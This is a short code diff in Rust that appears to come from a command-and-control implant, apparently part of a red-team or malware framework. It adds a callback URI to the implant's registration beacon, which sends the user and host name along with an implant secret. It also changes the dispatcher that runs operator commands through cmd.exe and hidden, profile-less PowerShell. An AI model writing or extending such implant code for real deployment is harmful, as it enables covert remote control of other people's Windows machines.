@@ -32,6 +32,7 @@ pub fn link_loop() {
         crate::CALLBACK,
         crate::IMPLANT_SECRET,
         crate::PAYLOAD_UUID,
+        crate::CALLBACK_URI,
         link_common::RegisterInfo {
             user: username(),
             host: hostname(),
@@ -58,13 +59,7 @@ fn get_integrity_level_int() -> u8 {
 // ── Command dispatch ─────────────────────────────────────────────────────────
 
 fn dispatch(command: &str, parameters: &str) -> String {
-    let raw = if parameters.is_empty() {
-        command.to_string()
-    } else {
-        format!("{} {}", command, parameters)
-    };
-
-    if let Some(output) = dispatch_common(&raw) {
+    if let Some(output) = dispatch_common(command, parameters) {
         return output;
     }
 
@@ -81,7 +76,7 @@ fn dispatch(command: &str, parameters: &str) -> String {
             &["-noP", "-sta", "-w", "1", "-c", parameters],
         ),
         "shell" => shell_exec("cmd.exe", &["/C", parameters]),
-        _ => shell_exec("cmd.exe", &["/C", &raw]),
+        _ => shell_exec("cmd.exe", &["/C", parameters]),
     }
 }
 
